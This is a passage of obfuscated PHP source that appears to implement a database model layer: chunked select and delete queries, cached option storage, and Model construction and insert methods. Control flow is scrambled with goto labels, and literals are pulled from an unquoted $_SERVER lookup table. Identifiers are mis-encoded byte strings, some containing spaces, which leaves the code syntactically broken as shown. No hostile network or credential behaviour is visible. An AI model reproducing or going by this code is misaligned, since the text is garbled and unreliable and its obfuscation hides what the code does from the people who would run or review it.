$aãïòãàÌ≈++; goto Dø´ßµ†≥ñ; Dø´ßµ†≥ñ: continue; goto c …Ãçºë‡; Cè—¢Æ•»ï: $aÉÌÙ∞Ç≠Ö = $this->db->escapeString($aÉÌÙ∞Ç≠Ö); if (!strpos($DÚ’ó»∂¨≠, $F¥•⁄úÒ¥õ[95])) { $DÚ’ó»∂¨≠ = $F¥•⁄úÒ¥õ[382] . $DÚ’ó»∂¨≠ . $F¥•⁄úÒ¥õ[382]; } $fﬁü™ÌæïØ = $F¥•⁄úÒ¥õ[182] . $aÉÌÙ∞Ç≠Ö . $F¥•⁄úÒ¥õ[182]; goto eˆœÚÚı◊Ö; aÕÏó°∆≈◊: $BÇ∫¿ßØ˘è = !0; $DÚ’ó»∂¨≠ = is_string($fÇˆË÷·ﬁÎ) ? $fÇˆË÷·ﬁÎ : $A©úË≥øÊ¨; $aÉÌÙ∞Ç≠Ö = substr($B∞∏“„ÀÑ[1], 1, strlen($B∞∏“„ÀÑ[1]) - 2); goto Cè—¢Æ•»ï; c …Ãçºë‡: } if (is_array($B∞∏“„ÀÑ)) { $A©úË≥øÊ¨ = is_string($fÇˆË÷·ﬁÎ) ? $fÇˆË÷·ﬁÎ : $A©úË≥øÊ¨; $B∞∏“„ÀÑ = $this->parseWhereLike($B∞∏“„ÀÑ, $A©úË≥øÊ¨, !0, $BÇ∫¿ßØ˘è); } if (is_numeric($fÇˆË÷·ﬁÎ)) { $DµπÇíàÔ¬[$aãïòãàÌ≈] = $B∞∏“„ÀÑ; $aãïòãàÌ≈++; } else { $DµπÇíàÔ¬[$fÇˆË÷·ﬁÎ] = $B∞∏“„ÀÑ; } } if ($BÇ∫¿ßØ˘è && !$c®í—≥ÇÑŒ) { } return $DµπÇíàÔ¬; goto e∂ß€Ü»∏é; e∂ß€Ü»∏é: } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($EëΩ‘á‚Ì⁄ = array()) { goto dﬂ„‰ÑÔè∂; bá„∆≈Ãï»: $dŒ«ßØ‰Ñä = is_array($dŒ«ßØ‰Ñä) ? $dŒ«ßØ‰Ñä : array(); $Cåù£¡ÊÎã = null; for ($d–¥óè¯‚˜ = 0; $d–¥óè¯‚˜ < count($dŒ«ßØ‰Ñä); $d–¥óè¯‚˜ += $cø„±±ò¶œ) { $D∫ë◊Ó°ü¢ = array_slice($dŒ«ßØ‰Ñä, $d–¥óè¯‚˜, $cø„±±ò¶œ); if (!is_array($D∫ë◊Ó°ü¢) || count($D∫ë◊Ó°ü¢) == 0) { break; } $e®í™öòüµ[$D‹ΩﬁıæÂ„[273]][$C™ﬁè¡Òª‹][1] = $D∫ë◊Ó°ü¢; $this->optionsValue($e®í™öòüµ); $a¡¢ãÿ•õ‡ = parent::select($EëΩ‘á‚Ì⁄); if (!$a¡¢ãÿ•õ‡) { continue; } $Cåù£¡ÊÎã = is_array($Cåù£¡ÊÎã) ? $Cåù£¡ÊÎã : array(); $Cåù£¡ÊÎã = array_merge($Cåù£¡ÊÎã, $a¡¢ãÿ•õ‡); } goto b˘»¯‹ßÀ∏; b˘»¯‹ßÀ∏: return $Cåù£¡ÊÎã; goto Aü‹∫èπ°¯; d€∑¶ëÓÑà: $C™ﬁè¡Òª‹ = $this->findWhereField($e®í™öòüµ); if (!$C™ﬁè¡Òª‹ || isset($e®í™öòüµ[$D‹ΩﬁıæÂ„[290]]) || isset($e®í™öòüµ[$D‹ΩﬁıæÂ„[351]])) { return parent::select($EëΩ‘á‚Ì⁄); } $dŒ«ßØ‰Ñä = $e®í™öòüµ[$D‹ΩﬁıæÂ„[273]][$C™ﬁè¡Òª‹][1]; goto bá„∆≈Ãï»; dﬂ„‰ÑÔè∂: $D‹ΩﬁıæÂ„ =& $_SERVER[ú∫]; $cø„±±ò¶œ = self::SQL_WHERE_IN_CHUNK; $e®í™öòüµ = $this->optionsValue(); goto d€∑¶ëÓÑà; Aü‹∫èπ°¯: } public function delete($F∑ΩâÏÕÎƒ = array()) { goto F∑”àË¬∆í; F∑”àË¬∆í: $F“∏¯ﬂáŸ∆ =& $_SERVER[ú∫]; $CÖ§áœÆ›ﬂ = self::SQL_WHERE_IN_CHUNK; $c„Æ’éÛÍä = $this->optionsValue(); goto fŸ˜ñ¿±ƒ‘; Dµ±§ıò∞á: $f”¥Ã¥àñò = $c„Æ’éÛÍä[$F“∏¯ﬂáŸ∆[273]][$Eˆ«Æ≤≤˘´][1]; $f”¥Ã¥àñò = is_array($f”¥Ã¥àñò) ? $f”¥Ã¥àñò : array(); for ($CêÜ«‰«ïÖ = 0; $CêÜ«‰«ïÖ < count($f”¥Ã¥àñò); $CêÜ«‰«ïÖ += $CÖ§áœÆ›ﬂ) { $A‚è´òÊ«é = array_slice($f”¥Ã¥àñò, $CêÜ«‰«ïÖ, $CÖ§áœÆ›ﬂ); if (!is_array($A‚è´òÊ«é) || count($A‚è´òÊ«é) == 0) { break; } $c„Æ’éÛÍä[$F“∏¯ﬂáŸ∆[273]][$Eˆ«Æ≤≤˘´][1] = $A‚è´òÊ«é; $this->optionsValue($c„Æ’éÛÍä); $eáôÚ√ö™å += parent::delete($F∑ΩâÏÕÎƒ); } goto CÖ»†ÚàΩÔ; fŸ˜ñ¿±ƒ‘: $Eˆ«Æ≤≤˘´ = $this->findWhereField($c„Æ’éÛÍä); if (!$Eˆ«Æ≤≤˘´) { return parent::delete($F∑ΩâÏÕÎƒ); } $eáôÚ√ö™å = 0; goto Dµ±§ıò∞á; CÖ»†ÚàΩÔ: return $eáôÚ√ö™å; goto f€èı»•Ωê; f€èı»•Ωê: } private function findWhereField($cø«Ÿëå‡ä) { $F«úËÃâ“‘ =& $_SERVER[ú∫]; $A∆È—Áñºä = self::SQL_WHERE_IN_CHUNK; if (!is_array($cø«Ÿëå‡ä) || !is_array($cø«Ÿëå‡ä[$F«úËÃâ“‘[273]])) { return !1; } foreach ($cø«Ÿëå‡ä[$F«úËÃâ“‘[273]] as $A·èà– Ú‰ => $AÊÆßÎ»õá) { if (is_array($AÊÆßÎ»õá) && isset($AÊÆßÎ»õá[0]) && is_string($AÊÆßÎ»õá[0]) && strtolower($AÊÆßÎ»õá[0]) == $F«úËÃâ“‘[7] && is_array($AÊÆßÎ»õá[1]) && count($AÊÆßÎ»õá[1]) > $A∆È—Áñºä) { ignore_timeout(); return $A·èà– Ú‰; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\x65\x6d\117\160\164\x69\x6f\x6e"; public $field = array(); public function listData($cÿ≤àÍÔÍ = false, $aãì•±µı© = "\x6d\x6f\x64\151\146\x79\124\x69\x6d\145", $A•¶¶ÇÂáÊ = false) { $eÒÃΩïÛ”√ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$eÒÃΩïÛ”√) { return $cÿ≤àÍÔÍ ? null : array(); } if (!$cÿ≤àÍÔÍ) { $eÒÃΩïÛ”√ = array_filter(array_values($eÒÃΩïÛ”√)); return array_sort_by($eÒÃΩïÛ”√, $aãì•±µı©, $A•¶¶ÇÂáÊ); } return $eÒÃΩïÛ”√[$_SERVER[ú∫][390] . $cÿ≤àÍÔÍ]; } public function insert($E¡„å¶ÚÓ¡) { goto cî¯â≥∞åÜ; dΩÌÛâó£Ã: $E¡„å¶ÚÓ¡[$Eûæòç´ä´[84]] = time(); Model($this->modelType)->set($Eûæòç´ä´[391], $dá†¡Â™‚«, $this->optionType . $Eûæòç´ä´[392]); Model($this->modelType)->set($Eûæòç´ä´[390] . $dá†¡Â™‚«, $E¡„å¶ÚÓ¡, $this->optionType); goto d≈Â∏å≠∏„; båªÆ—ÖÁÍ: $dá†¡Â™‚« = $dá†¡Â™‚« ? $dá†¡Â™‚« : 0; $E¡„å¶ÚÓ¡[$Eûæòç´ä´[393]] = ++$dá†¡Â™‚«; $E¡„å¶ÚÓ¡[$Eûæòç´ä´[194]] = time(); goto dΩÌÛâó£Ã; cî¯â≥∞åÜ: $Eûæòç´ä´ =& $_SERVER[ú∫]; $E¡„å¶ÚÓ¡ = array_field_key($E¡„å¶ÚÓ¡, $this->field); $dá†¡Â™‚« = Model($this->modelType)->get($Eûæòç´ä´[391], $this->optionType . $Eûæòç´ä´[392]); goto båªÆ—ÖÁÍ; d≈Â∏å≠∏„: return $dá†¡Â™‚«; goto eáÉÁÍ≠ µ; eáÉÁÍ≠ µ: } public function update($e¿¬¢êÓëÊ, $dÿ÷™Ôà¶÷) { goto cäÁ—Œ®ƒì; FÈÖ˘∑‹…Ê: if (!$aΩ∂É‘œå) { return !1; } $dÿ÷™Ôà¶÷ = array_merge($aΩ∂É‘œå, $dÿ÷™Ôà¶÷); $dÿ÷™Ôà¶÷[$eıøºüé´í[84]] = time(); goto C–‚ﬂ°µÇÁ; cäÁ—Œ®ƒì: $eıøºüé´í =& $_SERVER[ú∫]; $dÿ÷™Ôà¶÷ = array_field_key($dÿ÷™Ôà¶÷, $this->field); $aΩ∂É‘œå = $this->listData($e¿¬¢êÓëÊ); goto FÈÖ˘∑‹…Ê; C–‚ﬂ°µÇÁ: return Model($this->modelType)->set($eıøºüé´í[390] . $e¿¬¢êÓëÊ, $dÿ÷™Ôà¶÷, $this->optionType); goto AÕÈ∂ôÇÒï; AÕÈ∂ôÇÒï: } public function remove($AèüâãûÔÒ) { return Model($this->modelType)->remove($_SERVER[ú∫][390] . $AèüâãûÔÒ, $this->optionType); } public function clear() { $d˘Çïéúáı =& $_SERVER[ú∫]; Model($this->modelType)->remove($d˘Çïéúáı[391], $this->optionType . $d˘Çïéúáı[392]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($añ“º±ú¥, $dÈ“∞Éø‘) { if (!$dÈ“∞Éø‘) { return !1; } $eÁÓ»èﬂË˘ = $this->listData(); $eÁÓ»èﬂË˘ = array_to_keyvalue($eÁÓ»èﬂË˘, $añ“º±ú¥); return isset($eÁÓ»èﬂË˘[$dÈ“∞Éø‘]) ? $eÁÓ»èﬂË˘[$dÈ“∞Éø‘] : !1; } public function findByName($E¢·éÎ¢ê) { return $this->findByKey($_SERVER[ú∫][28], $E¢·éÎ¢ê); } protected function resetData($FòºÔöÒùˆ) { $C’áÂ‹Èæâ =& $_SERVER[ú∫]; $FòºÔöÒùˆ = is_array($FòºÔöÒùˆ) ? $FòºÔöÒùˆ : array(); $f¢ŸÙ±Œˆ¨ = array(); for ($E¿Ë∞Ãâö™ = 0; $E¿Ë∞Ãâö™ < count($FòºÔöÒùˆ); $E¿Ë∞Ãâö™++) { $f¢ŸÙ±Œˆ¨[$C’áÂ‹Èæâ[390] . $FòºÔöÒùˆ[$E¿Ë∞Ãâö™][$C’áÂ‹Èæâ[393]]] = $FòºÔöÒùˆ[$E¿Ë∞Ãâö™]; } return Model($this->modelType)->set($f¢ŸÙ±Œˆ¨, !1, $this->optionType); } private function getAutoName($d±¡ª≤ˆòÎ) { $eÉ¡Ö–Ã¢ = array_to_keyvalue($this->listData(), $_SERVER[ú∫][28]); if (!$eÉ¡Ö–Ã¢ || !isset($eÉ¡Ö–Ã¢[$d±¡ª≤ˆòÎ])) { return $d±¡ª≤ˆòÎ; } for ($CÎÇﬂª∂Á = 1; $CÎÇﬂª∂Á < count($eÉ¡Ö–Ã¢); $CÎÇﬂª∂Á++) { $e“ÍÓÏŒñ‹ = $d±¡ª≤ˆòÎ . "\50{$CÎÇﬂª∂Á}\x29"; if (!isset($eÉ¡Ö–Ã¢[$e“ÍÓÏŒñ‹])) { return $e“ÍÓÏŒñ‹; } } return $e“ÍÓÏŒñ‹; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($cê«é∫¨Ñı = false, $aüÆµº¨¥œ = '', $a—±üª¥Ïè = false) { goto cÀÒ ™Ï ‹; DØ÷°•”ÏÍ: $this->cacheSet($aüÆµº¨¥œ, $Cæö⁄Ó≠ ≥); $Cæö⁄Ó≠ ≥ = array_merge($bÁÖ≈Ì®Ó‰, $Cæö⁄Ó≠ ≥); return $cê«é∫¨Ñı ? $Cæö⁄Ó≠ ≥[$cê«é∫¨Ñı] : $Cæö⁄Ó≠ ≥; goto bôÿ≤°™Ñ∞; AµÍûåöˆ: $bÁÖ≈Ì®Ó‰ = is_array($bÁÖ≈Ì®Ó‰) ? $bÁÖ≈Ì®Ó‰ : array(); if (is_array($Cæö⁄Ó≠ ≥)) { $Cæö⁄Ó≠ ≥ = array_merge($bÁÖ≈Ì®Ó‰, $Cæö⁄Ó≠ ≥); return $cê«é∫¨Ñı ? isset($Cæö⁄Ó≠ ≥[$cê«é∫¨Ñı]) ? $Cæö⁄Ó≠ ≥[$cê«é∫¨Ñı] : null : $Cæö⁄Ó≠ ≥; } $D∞ŒîúÁãŸ = $this->filterWhere(array($E√ÉÙªÎí¬[29] => $aüÆµº¨¥œ)); goto Dó’ËﬁŸπû; Dó’ËﬁŸπû: $Cæö⁄Ó≠ ≥ = $this->where($D∞ŒîúÁãŸ)->select(); $Cæö⁄Ó≠ ≥ = array_to_keyvalue($Cæö⁄Ó≠ ≥, $E√ÉÙªÎí¬[93], $E√ÉÙªÎí¬[372]); foreach ($Cæö⁄Ó≠ ≥ as $FÈÚêÔæõ√ => $eÛ˜òÂÂÉ) { if ($a—±üª¥Ïè || in_array($FÈÚêÔæõ√, $this->jsonField)) { $Cæö⁄Ó≠ ≥[$FÈÚêÔæõ√] = json_decode($eÛ˜òÂÂÉ, !0); } } goto DØ÷°•”ÏÍ; cÀÒ ™Ï ‹: $E√ÉÙªÎí¬ =& $_SERVER[ú∫]; $Cæö⁄Ó≠ ≥ = $this->cacheGet($aüÆµº¨¥œ); $bÁÖ≈Ì®Ó‰ = $this->optionDefault($aüÆµº¨¥œ); goto AµÍûåöˆ; bôÿ≤°™Ñ∞: } public function set($A‹ìêÓÈóí, $eã¯öß«Éù = false, $cñ≥úÙ»Ã = '') { goto c—ÀŒ¥àÆª; CÖ£ÕàÌ¢∏: return $this->addAll($E’•“Üë√ã, array(), !0); goto B–Œíªƒä ; c—ÀŒ¥àÆª: $Aı‡ÒÑ‹¶Ê =& $_SERVER[ú∫]; $this->cacheRemove($cñ≥úÙ»Ã); $E’•“Üë√ã = array(); goto FûãËÍêÏå; FûãËÍêÏå: $FÒËÂÕÂã° = is_array($A‹ìêÓÈóí) ? $A‹ìêÓÈóí : array($A‹ìêÓÈóí => $eã¯öß«Éù); foreach ($FÒËÂÕÂã° as $D◊¿≤îÆº¶ => $DÆÇ◊©Ó–Ô) { if (is_array($DÆÇ◊©Ó–Ô)) { $DÆÇ◊©Ó–Ô = json_encode_force($DÆÇ◊©Ó–Ô); } $this->checkLength($DÆÇ◊©Ó–Ô, !1, $this->tableName . $Aı‡ÒÑ‹¶Ê[4] . $A‹ìêÓÈóí); $DÆÇ◊©Ó–Ô = self::textEncode($DÆÇ◊©Ó–Ô); $FÒËÂÕÂã° = array($Aı‡ÒÑ‹¶Ê[29] => $cñ≥úÙ»Ã, $Aı‡ÒÑ‹¶Ê[93] => $D◊¿≤îÆº¶, $Aı‡ÒÑ‹¶Ê[372] => $DÆÇ◊©Ó–Ô); $E’•“Üë√ã[] = $this->filterWhere($FÒËÂÕÂã°); } if (!$E’•“Üë√ã) { return !0; } goto CÖ£ÕàÌ¢∏; B–Œíªƒä : } protected function optionDefault($e®Àê›–∑Ì = '') { return !1; } public function setDeep($fÉ√≥®ö≤ú, $DÀÛá∫˘—∑ = false, $cÍã‡«±ë≤ = '') { $e•ÃÕ∞ıŸË = explode($_SERVER[ú∫][95], $fÉ√≥®ö≤ú); $C∫˘»ﬁ¢’˘ = $this->get(); array_set_value($C∫˘»ﬁ¢’˘, $fÉ√≥®ö≤ú, $DÀÛá∫˘—∑); $this->set($e•ÃÕ∞ıŸË[0], $C∫˘»ﬁ¢’˘[$e•ÃÕ∞ıŸË[0]], $cÍã‡«±ë≤); } public function remove($DÆÜÛ¢Ûã, $Eîœ˘·’ıß = '') { $A◊ΩèŒè†é =& $_SERVER[ú∫]; $this->cacheRemove($Eîœ˘·’ıß); $dÉë∆êÂ‘Î = $this->filterWhere(array($A◊ΩèŒè†é[93] => $DÆÜÛ¢Ûã, $A◊ΩèŒè†é[29] => $Eîœ˘·’ıß)); if (is_null($DÆÜÛ¢Ûã)) { unset($dÉë∆êÂ‘Î[$A◊ΩèŒè†é[93]]); } return $this->where($dÉë∆êÂ‘Î)->delete(); } public function cacheSet($BãààÆ“∑Ï, $BüáÖÌÒ‘¡ = false) { return Cache::set($this->cacheKey($BãààÆ“∑Ï), $BüáÖÌÒ‘¡); } public function cacheGet($DÓ¿ÙöÃÀï) { return Cache::get($this->cacheKey($DÓ¿ÙöÃÀï)); } public function cacheRemove($F‹Ö––î∂ã) { return Cache::remove($this->cacheKey($F‹Ö––î∂ã)); } protected function filterWhere($eÏ€ÜØ≈á) { return $eÏ€ÜØ≈á; } protected function cacheKey($DÔ÷à®œøà) { return $DÔ÷à®œøà; } } goto A≤”‰´ÚÃ›; C–≤ﬁùçíâ: define($_SERVER[ú∫][240], 0); define($_SERVER[ú∫][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\x62\154\145", "\157\x72\x64\145\162", "\x61\x6c\x69\141\163", "\150\141\x76\151\156\147", "\147\162\157\x75\x70", "\x6c\x6f\143\153", "\144\151\163\x74\x69\156\143\x74", "\141\165\x74\157", "\x66\151\x6c\x74\145\162", "\x76\x61\154\151\x64\x61\164\145", "\x72\x65\163\165\154\164", "\142\151\x6e\x64", "\164\x6f\x6b\145\x6e"); public function __construct($b‰ÏÉÖ€ø§ = '', $c»ﬂúòº€Ç = '', $eÊƒéùËÉÃ = '') { $EèøßÁçÒÁ =& $_SERVER[ú∫]; $this->_initialize(); if (!empty($b‰ÏÉÖ€ø§)) { if (strpos($b‰ÏÉÖ€ø§, $EèøßÁçÒÁ[95])) { list($this->dbName, $this->name) = explode($EèøßÁçÒÁ[95], $b‰ÏÉÖ€ø§); } else { $this->name = $b‰ÏÉÖ€ø§; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($c»ﬂúòº€Ç)) { $this->tablePrefix = $EèøßÁçÒÁ[33]; } elseif ($EèøßÁçÒÁ[33] != $c»ﬂúòº€Ç) { $this->tablePrefix = $c»ﬂúòº€Ç; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($EèøßÁçÒÁ[242]); } $this->db(0, empty($this->connection) ? $eÊƒéùËÉÃ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $e¶Éòµ‚ﬁ =& $_SERVER[ú∫]; if (empty($this->fields)) { if (think_config($e¶Éòµ‚ﬁ[243])) { $DÓÊñÙª”ô = $this->dbName ? $this->dbName : think_config($e¶Éòµ‚ﬁ[244]); $a™ôõó¨ê† = think_var_cache($e¶Éòµ‚ﬁ[245] . strtolower(get_path_this($DÓÊñÙª”ô) . $e¶Éòµ‚ﬁ[95] . $this->name)); if ($a™ôõó¨ê†) { $D‘©ÜÛ’“≤ = think_config($e¶Éòµ‚ﬁ[246]); if (empty($D‘©ÜÛ’“≤) || $a™ôõó¨ê†[$e¶Éòµ‚ﬁ[247]] == $D‘©ÜÛ’“≤) { $this->fields = $a™ôõó¨ê†; return; } } } $this->flush(); } } public function flush() { goto DπÍ∑ÀÌÍ´; b˘Ôƒ¥èÓ‘: if (think_config($eß¨«ÿâ¬Ì[243])) { $e©¥—Ç∞ÛÜ = $this->dbName ? $this->dbName : think_config($eß¨«ÿâ¬Ì[244]); think_var_cache($eß¨«ÿâ¬Ì[245] . strtolower(get_path_this($e©¥—Ç∞ÛÜ) . $eß¨«ÿâ¬Ì[95] . $this->name), $this->fields); } goto cÇù®ì•Ôû; DπÍ∑ÀÌÍ´: $eß¨«ÿâ¬Ì =& $_SERVER[ú∫]; $this->db->setModel($this->name); $e’óÂΩ»∑ù = $this->db->getFields($this->getTableName()); goto FúÆÛÜ÷îô; DÂøÖÇ©€å: foreach ($e’óÂΩ»∑ù as $B€Úéî¯¶ü => $dÜßÆƒ¬–Œ) { $cÕ”ÓçÎÔù[$B€Úéî¯¶ü] = $dÜßÆƒ¬–Œ[$eß¨«ÿâ¬Ì[29]]; if ($dÜßÆƒ¬–Œ[$eß¨«ÿâ¬Ì[36]]) { $this->fields[$eß¨«ÿâ¬Ì[249]] = $B€Úéî¯¶ü; if ($dÜßÆƒ¬–Œ[$eß¨«ÿâ¬Ì[39]]) { $this->fields[$eß¨«ÿâ¬Ì[248]] = !0; } } } $this->fields[$eß¨«ÿâ¬Ì[250]] = $cÕ”ÓçÎÔù; if (think_config($eß¨«ÿâ¬Ì[246])) { $this->fields[$eß¨«ÿâ¬Ì[247]] = think_config($eß¨«ÿâ¬Ì[246]); } goto b˘Ôƒ¥èÓ‘; FúÆÛÜ÷îô: if (!$e’óÂΩ»∑ù) { return !1; } $this->fields = array_keys($e’óÂΩ»∑ù); $this->fields[$eß¨«ÿâ¬Ì[248]] = !1; goto DÂøÖÇ©€å; cÇù®ì•Ôû: } public function switchModel($F—ı˜ÉŒàÉ, $Fçé“Ïôå– = array()) { $bî€≠≠âØ≥ =& $_SERVER[ú∫]; $e·™ªª‰∞å = ucwords(strtolower($F—ı˜ÉŒàÉ)) . $bî€≠≠âØ≥[251]; if (!class_exists($e·™ªª‰∞å)) { think_exception($e·™ªª‰∞å . think_lang($bî€≠≠âØ≥[252])); } $this->_extModel = new $e·™ªª‰∞å($this->name); if (!empty($Fçé“Ïôå–)) { foreach ($Fçé“Ïôå– as $bËÃËéƒâ≤) { $this->_extModel->setProperty($bËÃËéƒâ≤, $this->{$bËÃËéƒâ≤}); } } return $this->_extModel; } public function __set($fÓ†‡œßÜ†, $Eë∞ø˘ê©à) { $this->data[$fÓ†‡œßÜ†] = $Eë∞ø˘ê©à; } public function __get($a¬èÈû˘≤∏) { return isset($this->data[$a¬èÈû˘≤∏]) ? $this->data[$a¬èÈû˘≤∏] : null; } public function __isset($CÆÜÇ‹◊≥õ) { return isset($this->data[$CÆÜÇ‹◊≥õ]); } public function __unset($aü¶†æå¬à) { unset($this->data[$aü¶†æå¬à]); } public function __call($f‡èÏ˘»ú”, $aâçâ«∂§Ò) { $aÎÁˆéã≥é =& $_SERVER[ú∫]; if (in_array(strtolower($f‡èÏ˘»ú”), $this->methods, !0)) { $this->options[strtolower($f‡èÏ˘»ú”)] = $aâçâ«∂§Ò[0]; return $this; } elseif (in_array(strtolower($f‡èÏ˘»ú”), array($aÎÁˆéã≥é[253], $aÎÁˆéã≥é[254], $aÎÁˆéã≥é[255], $aÎÁˆéã≥é[256], $aÎÁˆéã≥é[257]), !0)) { $c¡∫©¨‚âÂ = isset($aâçâ«∂§Ò[0]) ? $aâçâ«∂§Ò[0] : $aÎÁˆéã≥é[182]; $c¡∫©¨‚âÂ = $this->db->parseKey($c¡∫©¨‚âÂ); return $this->getField(strtoupper($f‡èÏ˘»ú”) . $aÎÁˆéã≥é[258] . $c¡∫©¨‚âÂ . $aÎÁˆéã≥é[259] . $f‡èÏ˘»ú”, $aÎÁˆéã≥é[253]); } elseif (strtolower(substr($f‡èÏ˘»ú”, 0, 5)) == $aÎÁˆéã≥é[260]) { $c¡∫©¨‚âÂ = think_parse_name(substr($f‡èÏ˘»ú”, 5)); $d¬èÕÒáü°[$c¡∫©¨‚âÂ] = $aâçâ«∂§Ò[0]; return $this->where($d¬èÕÒáü°)->find(); } elseif (strtolower(substr($f‡èÏ˘»ú”, 0, 10)) == $aÎÁˆéã≥é[261]) { $a˜Ñ“çà◊º = think_parse_name(substr($f‡èÏ˘»ú”, 10)); $d¬èÕÒáü°[$a˜Ñ“çà◊º] = $aâçâ«∂§Ò[0]; return $this->where($d¬èÕÒáü°)->getField($aâçâ«∂§Ò[1]); } elseif (isset($this->_scope[$f‡èÏ˘»ú”])) { return $this->scope($f‡èÏ˘»ú”, $aâçâ«∂§Ò[0]); } elseif (method_exists($this, $f‡èÏ˘»ú”)) { array_unshift($aâçâ«∂§Ò, $f‡èÏ˘»ú”); return call_user_func_array(array($this, $aÎÁˆéã≥é[262]), $aâçâ«∂§Ò); } else { return call_user_func_array(array(parent, $f‡èÏ˘»ú”), $aâçâ«∂§Ò); } } protected function call() { goto d¯†ÊÓ¶ÿ…; dÇ·ã≈öãé: $d√Ö…‘Ÿø¥ = call_user_func_array(array($this, $b´≤•Ô’ “), $A»ãòÿÆîà); if (method_exists($this, $E˜Û›≤ÖΩÖ[266])) { $d∑©ûø—æµ = call_user_func_array(array($this, $E˜Û›≤ÖΩÖ[267]), array($Eıù°ãÆ§≈, $A»ãòÿÆîà, $d√Ö…‘Ÿø¥)); if ($d∑©ûø—æµ) { return $d∑©ûø—æµ; } } return $d√Ö…‘Ÿø¥; goto cœﬁ÷»ÖÇ—; D«ƒô‚Ã‡ï: $Eıù°ãÆ§≈ = $b´≤•Ô’ “; if (is_array($b´≤•Ô’ “)) { $Eıù°ãÆ§≈ = $b´≤•Ô’ “[1]; $b´≤•Ô’ “ = $b´≤•Ô’ “[0]; } $CË•À‡òà¯ = count($A»ãòÿÆîà) - 1; goto Dõ⁄≥¶ﬂ∫‘; Dõ⁄≥¶ﬂ∫‘: if (isset($A»ãòÿÆîà[$CË•À‡òà¯]) && $A»ãòÿÆîà[$CË•À‡òà¯] === $b´≤•Ô’ “) { think_exception(__CLASS__ . $E˜Û›≤ÖΩÖ[4] . $b´≤•Ô’ “ . think_lang($E˜Û›≤ÖΩÖ[263])); return; } $A»ãòÿÆîà[] = $b´≤•Ô’ “; if (method_exists($this, $E˜Û›≤ÖΩÖ[264])) { $d∑©ûø—æµ = call_user_func_array(array($this, $E˜Û›≤ÖΩÖ[265]), array($Eıù°ãÆ§≈, $A»ãòÿÆîà)); if (!is_null($d∑©ûø—æµ) && $d∑©ûø—æµ !== !1) { return $d∑©ûø—æµ; } } goto dÇ·ã≈öãé; d¯†ÊÓ¶ÿ…: $E˜Û›≤ÖΩÖ =& $_SERVER[ú∫]; $A»ãòÿÆîà = func_get_args(); $b´≤•Ô’ “ = array_shift($A»ãòÿÆîà); goto D«ƒô‚Ã‡ï; cœﬁ÷»ÖÇ—: } protected function _initialize() { } protected function _facade($a”£åçÎ¡å) { $dÓ´¶„òµË =& $_SERVER[ú∫]; if (!empty($this->fields)) { foreach ($a”£åçÎ¡å as $D©Ó¨âû∞Œ => $b√∏æÇïüƒ) { if (is_array($this->fields) && !in_array($D©Ó¨âû∞Œ, $this->fields, !0)) { unset($a”£åçÎ¡å[$D©Ó¨âû∞Œ]); } elseif (is_scalar($b√∏æÇïüƒ)) { $this->_parseType($a”£åçÎ¡å, $D©Ó¨âû∞Œ); } } } if (!empty($this->options[$dÓ´¶„òµË[268]])) { $a”£åçÎ¡å = array_map($this->options[$dÓ´¶„òµË[268]], $a”£åçÎ¡å); unset($this->options[$dÓ´¶„òµË[268]]); } $this->_beforeWrite($a”£åçÎ¡å); return $a”£åçÎ¡å; } protected function _beforeWrite(&$cíÃÎëÁﬁ√) { } public function add($D‡™ßí“Øû = '', $B∆ÖÖÌ ‰Ÿ = array(), $Dº¬Ó¥“˘ñ = false) { goto A ˜å£âÚ‰; A ˜å£âÚ‰: if (empty($D‡™ßí“Øû)) { if (!empty($this->data)) { $D‡™ßí“Øû = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ú∫][269]); return !1; } } $B∆ÖÖÌ ‰Ÿ = $this->_parseOptions($B∆ÖÖÌ ‰Ÿ); $D‡™ßí“Øû = $this->_facade($D‡™ßí“Øû); goto EËöˆ¢ÂÏ∏; EËöˆ¢ÂÏ∏: if (!1 === $this->_beforeInsert($D‡™ßí“Øû, $B∆ÖÖÌ ‰Ÿ)) { return !1; } $e∞›ﬂÉéõŸ = $this->db->insert($D‡™ßí“Øû, $B∆ÖÖÌ ‰Ÿ, $Dº¬Ó¥“˘ñ); if (!1 !== $e∞›ﬂÉéõŸ) { $bÑﬂã“∞≤¶ = $this->getLastInsID(); if ($bÑﬂã“∞≤¶) { $D‡™ßí“Øû[$this->getPk()] = $bÑﬂã“∞≤¶; $this->_after_insert($D‡™ßí“Øû, $B∆ÖÖÌ ‰Ÿ); return $bÑﬂã“∞≤¶; } $this->_after_insert($D‡™ßí“Øû, $B∆ÖÖÌ ‰Ÿ); } goto A√øØªƒ„‹; A√øØªƒ„‹: return $e∞›ﬂÉéõŸ; goto Dì∂Ÿ§÷†; Dì∂Ÿ§÷†: } protected function _beforeInsert(&$c∑√ç«œê, $dûâá∞„Ÿë) { } protected function _after_insert($C—ﬁíÌÿÖÉ, $EÑÍó‘§ı‹) { } public function addAll($bÙ€òˆÌãé, $bÂöæƒ†·Û = array(), $e¥™∆‡äúÜ = false) { goto b“‚ÚÒÌàè; FÆÕõ»“∆›: foreach ($bÙ€òˆÌãé as $eˆá∆•Û∞Ô => $aé≥é”ı‰Î) { $bÙ€òˆÌãé[$eˆá∆•Û∞Ô] = $this->_facade($aé≥é”ı‰Î); } if (method_exists($this->db, $FﬂÑ„≈ÒÚÖ[270])) { $fÿŒ¥ëàÙ¯ = 